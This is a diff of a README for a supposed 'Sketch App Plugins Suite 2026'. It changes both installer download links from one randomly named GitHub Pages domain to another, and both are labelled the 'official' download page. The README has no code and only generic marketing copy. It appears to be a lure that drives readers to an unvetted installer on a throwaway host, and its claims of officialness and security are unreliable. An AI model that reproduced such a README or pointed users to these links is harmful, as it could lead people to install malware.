@@ -2,7 +2,7 @@
 
 This repository provides the Sketch App Plugins Suite 2026, a comprehensive collection of plugins specifically developed to enhance your design workflow within Sketch App. Designed for both novice and experienced designers, this suite includes a range of tools that simplify complex tasks, improve efficiency, and foster creativity. By integrating these plugins, you can access advanced symbols, customizable templates, and collaborative features that are essential for modern design projects. Download the latest version to unlock the full potential of Sketch with enhanced performance and new capabilities.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -64,6 +64,6 @@ A: Yes, you can reach out to our support team via the contact information on the
 
 Access the Sketch App Plugins Suite from the official download page:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 Alternatively, use the prominent download button at the top of this README for quick access. Ensure you always download the latest version for the best experience, security, and compatibility with Sketch App. Thank you for using the Sketch App Plugins Suite—we are committed to providing tools that empower designers and enhance the creative process.
